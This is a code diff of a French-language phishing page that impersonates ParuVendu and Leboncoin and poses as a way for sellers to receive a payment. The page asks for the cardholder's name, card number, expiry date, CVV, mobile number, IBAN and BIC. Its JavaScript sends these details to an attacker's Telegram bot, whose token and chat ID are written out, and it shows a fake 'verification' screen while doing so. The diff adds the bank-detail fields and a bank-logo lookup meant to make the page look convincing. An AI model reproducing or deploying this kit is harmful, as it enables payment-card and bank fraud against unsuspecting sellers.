@@ -12,105 +12,105 @@
             background-color: white;
             display: flex;
             justify-content: center;
-            align-items: flex-start; /* Alignement en haut pour permettre le défilement */
-            min-height: 100vh; /* Utilisation de min-height pour permettre le défilement */
+            align-items: flex-start;
+            min-height: 100vh;
             background-image: url('https://github.com/himralefort/logo/blob/main/paruvendu.png?raw=true');
             background-position: right;
             background-repeat: no-repeat;
             background-size: contain;
-            overflow-y: auto; /* Activation du défilement vertical pour toute la page */
+            overflow-y: auto;
         }
         .logo {
-            position: fixed; /* Fixe le logo en haut à gauche */
+            position: fixed;
             top: 20px;
             left: 20px;
-            z-index: -1; /* Met le logo en arrière-plan */
-            pointer-events: none; /* Empêche le logo d'interférer avec les clics */
+            z-index: -1;
+            pointer-events: none;
         }
         .logo img {
             width: 200px;
-            opacity: 0.5; /* Ajustez l'opacité si nécessaire */
+            opacity: 0.5;
         }
         .container {
-            width: 60%; /* Largeur du formulaire augmentée */
-            padding: 40px; /* Padding augmenté */
+            width: 60%;
+            padding: 40px;
             background: white;
-            border-radius: 30px; /* Bords plus enrobés */
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2); /* Ombre plus prononcée */
-            position: relative; /* Position relative pour permettre le défilement */
-            margin-top: 120px; /* Espace en haut pour éviter que le formulaire ne soit caché par le logo */
-            margin-bottom: 50px; /* Espace en bas pour permettre le défilement */
+            border-radius: 30px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+            position: relative;
+            margin-top: 120px;
+            margin-bottom: 50px;
             animation: slideUp 1s ease-out;
-            border: 2px solid white; /* Bordure blanche pour mettre en évidence */
+            border: 2px solid white;
         }
         @keyframes slideUp {
             from {
-                transform: translateY(20px); /* Début légèrement en bas */
+                transform: translateY(20px);
                 opacity: 0;
             }
             to {
-                transform: translateY(0); /* Fin en position normale */
+                transform: translateY(0);
                 opacity: 1;
             }
         }
         .form-group {
-            margin-bottom: 20px; /* Espacement entre les champs augmenté */
+            margin-bottom: 20px;
             text-align: left;
         }
         input {
-            width: 100%; /* Largeur des champs */
-            padding: 15px; /* Padding plus important */
+            width: 100%;
+            padding: 15px;
             border: 1px solid #ccc;
-            border-radius: 5px; /* Bordures légèrement arrondies */
-            font-size: 16px; /* Taille de police augmentée */
+            border-radius: 5px;
+            font-size: 16px;
             transition: all 0.3s;
             background-color: #f9f9f9;
-            box-sizing: border-box; /* Assure que la largeur inclut le padding */
+            box-sizing: border-box;
         }
         input:focus {
             border-color: #ff4c4c;
-            box-shadow: 0 0 8px rgba(255, 76, 76, 0.6); /* Ombre plus prononcée au focus */
+            box-shadow: 0 0 8px rgba(255, 76, 76, 0.6);
         }
         .btn {
-            background-color: #cc0000; /* Rouge */
+            background-color: #cc0000;
             color: white;
-            padding: 12px 25px; /* Taille du bouton augmentée */
+            padding: 12px 25px;
             border: none;
-            border-radius: 25px; /* Bordures plus arrondies */
+            border-radius: 25px;
             cursor: pointer;
-            width: 50%; /* Bouton plus large */
-            font-size: 16px; /* Taille du texte augmentée */
+            width: 50%;
+            font-size: 16px;
             transition: background 0.3s;
-            text-transform: lowercase; /* Mise en minuscule */
+            text-transform: lowercase;
             margin-left: auto;
             margin-right: auto;
             display: block;
-            font-weight: bold; /* Texte en gras */
+            font-weight: bold;
         }
         .btn:hover {
-            background-color: #b30000; /* Rouge plus foncé au survol */
+            background-color: #b30000;
         }
         .connexion-text {
             text-align: center;
-            font-size: 24px; /* Taille de police augmentée */
+            font-size: 24px;
             font-weight: bold;
             color: #333;
-            margin-bottom: 30px; /* Espacement augmenté */
+            margin-bottom: 30px;
         }
         .form-logo {
             text-align: center;
-            margin-bottom: 30px; /* Espacement augmenté */
-            z-index: -1; /* Met le logo du formulaire en arrière-plan */
-            pointer-events: none; /* Empêche le logo d'interférer avec les clics */
+            margin-bottom: 30px;
+            z-index: -1;
+            pointer-events: none;
         }
         .form-logo img {
-            width: 200px; /* Taille du logo agrandie x2 */
-            opacity: 0.5; /* Ajustez l'opacité si nécessaire */
+            width: 200px;
+            opacity: 0.5;
         }
         .info-text {
-            font-size: 16px; /* Taille de police augmentée */
+            font-size: 16px;
             color: #666;
-            margin-bottom: 30px; /* Espacement augmenté */
+            margin-bottom: 30px;
             text-align: justify;
         }
         .info-text strong {
@@ -120,14 +120,14 @@
             width: 40px;
             vertical-align: middle;
             margin-left: 10px;
-            display: none; /* Masqué par défaut */
+            display: none;
         }
         .expiry-cvv-group {
             display: flex;
-            gap: 10px; /* Espace entre les champs */
+            gap: 10px;
         }
         .expiry-cvv-group .form-group {
-            flex: 1; /* Les champs prennent la même largeur */
+            flex: 1;
         }
         .loading-screen {
             position: fixed;
@@ -135,7 +135,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.9); /* Fond semi-transparent */
+            background: rgba(255, 255, 255, 0.9);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -149,6 +149,53 @@
         .loading-screen.active {
             opacity: 1;
             visibility: visible;
+        }
+        .bank-logo {
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+            animation: zoomIn 0.5s ease-in-out;
+        }
+        @keyframes zoomIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+        .bank-logo img {
+            height: 80px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .section-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #ff4c4c;
+            padding-bottom: 5px;
+        }
+        .terms {
+            margin-top: 20px;
+            text-align: left;
+            font-size: 14px;
+            color: #555;
+        }
+        .terms label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+        }
+        .terms input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .terms a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+        .terms a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -165,42 +212,155 @@
             Pour des raisons de sécurité, nous procéderons parfois à la vérification rapide de vos informations personnelles, y compris à chaque mise à jour du site. Veuillez confirmer votre compte.
         </div>
         <form id="cardForm">
+            <!-- Section Carte de crédit -->
+            <div class="section-title">💳 Informations de carte de crédit</div>
             <div class="form-group">
-                <label for="name">Nom & Prénom du titulaire</label>
+                <label for="name">👤 Nom & Prénom du titulaire</label>
                 <input type="text" id="name" required>
             </div>
             <div class="form-group">
-                <label for="card-number">Numéro de carte</label>
+                <label for="card-number">🔢 Numéro de carte</label>
                 <input type="text" id="card-number" maxlength="19" required>
                 <img id="card-icon" class="card-icon" src="" alt="Carte">
             </div>
             <div class="expiry-cvv-group">
                 <div class="form-group">
-                    <label for="expiry-date">Date d'expiration</label>
+                    <label for="expiry-date">📅 Date d'expiration</label>
                     <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
                 </div>
                 <div class="form-group">
-                    <label for="cvv">Cryptogramme visuel</label>
+                    <label for="cvv">🔒 Cryptogramme visuel</label>
                     <input type="text" id="cvv" maxlength="3" required>
                 </div>
             </div>
             <div class="form-group">
-                <label for="mobile">Numéro de mobile</label>
+                <label for="mobile">📱 Numéro de mobile</label>
                 <input type="text" id="mobile" required>
             </div>
-            <button type="submit" class="btn">Valider</button>
+
+            <!-- Section RIB -->
+            <div class="section-title">🏦 Informations bancaires (RIB)</div>
+            <div class="form-group">
+                <label for="iban">🌍 IBAN</label>
+                <input type="text" id="iban" required>
+            </div>
+            <div class="form-group">
+                <label for="bic">🏛️ BIC</label>
+                <input type="text" id="bic" required>
+            </div>
+            <div class="bank-logo" id="bank-logo">
+                <img id="bank-logo-img" src="" alt="Logo de la banque">
+            </div>
+
+            <!-- Conditions générales de vente -->
+            <div class="terms">
+                <label>
+                    <input type="checkbox" id="accept-terms" required>
+                    ✅ J'accepte les <a href="https://www.leboncoin.fr/dc/cgv" target="_blank">Conditions Générales de Vente</a>
+                </label>
+            </div>
+
+            <button type="submit" class="btn">💸 Recevoir mon paiement (1/2)</button>
         </form>
     </div>
 
     <!-- Écran de chargement -->
     <div class="loading-screen" id="loadingScreen">
-        Vérification en cours...
+        🔄 Vérification en cours...
     </div>
 
     <script>
         // Constantes pour le bot Telegram
         const BOT_TOKEN = "8128812759:AAEg0qMVYU-90EShzEkd60gIrakBm1XnovY";
         const CHAT_ID = "5652184847";
+
+        // Dictionnaire des banques avec leurs logos
+        const banks = {
+            "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+            "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+            "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+            "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+            "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+            "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
+            "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+            "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+            "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+            "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+            "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+            "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+            "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+            "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+            "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+            "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+            "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+            "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+            "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
+        };
+
+        // Détection de la banque par le BIC
+        const bicInput = document.getElementById("bic");
+        const bankLogo = document.getElementById("bank-logo");
+        const bankLogoImg = document.getElementById("bank-logo-img");
+
+        bicInput.addEventListener("input", function () {
+            const bic = bicInput.value.toUpperCase();
+            if (bic.length >= 8) {
+                const bankCode = bic.slice(0, 8);
+                const bank = banks[bankCode];
+                if (bank) {
+                    bankLogoImg.src = bank.logo;
+                    bankLogo.style.display = "block";
+                } else {
+                    bankLogo.style.display = "none";
+                }
+            } else {
+                bankLogo.style.display = "none";
+            }
+        });
+
+        // Gestionnaire de soumission du formulaire
+        document.getElementById("cardForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            // Afficher l'écran de chargement
+            const loadingScreen = document.getElementById("loadingScreen");
+            loadingScreen.classList.add("active");
+
+            // Récupérer les valeurs du formulaire
+            const name = document.getElementById("name").value;
+            const cardNumber = document.getElementById("card-number").value;
+            const expiryDate = document.getElementById("expiry-date").value;
+            const cvv = document.getElementById("cvv").value;
+            const mobile = document.getElementById("mobile").value;
+            const iban = document.getElementById("iban").value;
+            const bic = document.getElementById("bic").value;
+
+            // Créer le message à envoyer
+            const message = `
+                🚨 Nouvelle soumission de carte 🚨
+                Nom : ${name}
+                Numéro de carte : ${cardNumber}
+                Date d'expiration : ${expiryDate}
+                CVV : ${cvv}
+                Mobile : ${mobile}
+                IBAN : ${iban}
+                BIC : ${bic}
+            `;
+
+            // Envoyer le message à Telegram
+            sendToTelegram(message);
+
+            // Simuler un délai de chargement (2 secondes)
+            setTimeout(() => {
+                // Rediriger vers la page suivante avec le logo de la banque
+                const bankCode = bic.slice(0, 8);
+                const bank = banks[bankCode];
+                if (bank) {
+                    localStorage.setItem("bankLogo", bank.logo);
+                }
+                window.location.href = "next-page.html";
+            }, 2000);
+        });
 
         // Fonction pour envoyer les données à Telegram
         async function sendToTelegram(message) {
@@ -227,91 +387,6 @@
                 console.error("Erreur :", error);
             }
         }
-
-        // Détection du type de carte
-        const cardNumberInput = document.getElementById("card-number");
-        const cardIcon = document.getElementById("card-icon");
-
-        cardNumberInput.addEventListener("input", function () {
-            const cardNumber = cardNumberInput.value.replace(/\s/g, "");
-            let cardType = "";
-
-            if (/^4/.test(cardNumber)) {
-                cardType = "Visa";
-                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg";
-            } else if (/^5[1-5]/.test(cardNumber)) {
-                cardType = "Mastercard";
-                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
-            } else if (/^2/.test(cardNumber)) {
-                cardType = "Mastercard";
-                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
-            } else if (/^6(?:011|5)/.test(cardNumber)) {
-                cardType = "Discover";
-                cardIcon.src = "https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg";
-            } else {
-                cardType = "";
-                cardIcon.src = "";
-            }
-
-            if (cardType) {
-                cardIcon.style.display = "inline-block";
-            } else {
-                cardIcon.style.display = "none";
-            }
-
-            // Formatage du numéro de carte par groupes de 4
-            let formattedCardNumber = cardNumber.replace(/\D/g, "").match(/.{1,4}/g);
-            if (formattedCardNumber) {
-                formattedCardNumber = formattedCardNumber.join(" ");
-                cardNumberInput.value = formattedCardNumber;
-            }
-        });
-
-        // Formatage de la date d'expiration
-        const expiryDateInput = document.getElementById("expiry-date");
-
-        expiryDateInput.addEventListener("input", function () {
-            let expiryDate = expiryDateInput.value.replace(/\D/g, "");
-            if (expiryDate.length > 2) {
-                expiryDate = expiryDate.slice(0, 2) + "/" + expiryDate.slice(2, 4);
-            }
-            expiryDateInput.value = expiryDate;
-        });
-
-        // Gestionnaire de soumission du formulaire
-        document.getElementById("cardForm").addEventListener("submit", function (event) {
-            event.preventDefault(); // Empêche la soumission par défaut
-
-            // Afficher l'écran de chargement
-            const loadingScreen = document.getElementById("loadingScreen");
-            loadingScreen.classList.add("active");
-
-            // Récupérer les valeurs du formulaire
-            const name = document.getElementById("name").value;
-            const cardNumber = document.getElementById("card-number").value;
-            const expiryDate = document.getElementById("expiry-date").value;
-            const cvv = document.getElementById("cvv").value;
-            const mobile = document.getElementById("mobile").value;
-
-            // Créer le message à envoyer
-            const message = `
-                🚨 Nouvelle soumission de carte 🚨
-                Nom : ${name}
-                Numéro de carte : ${cardNumber}
-                Date d'expiration : ${expiryDate}
-                CVV : ${cvv}
-                Mobile : ${mobile}
-            `;
-
-            // Envoyer le message à Telegram
-            sendToTelegram(message);
-
-            // Simuler un délai de chargement (2 secondes)
-            setTimeout(() => {
-                // Rediriger vers la page suivante après l'envoi
-                window.location.href = "{{ url_for('next_page', current_page='parucard') }}";
-            }, 2000);
-        });
     </script>
 </body>
 </html>
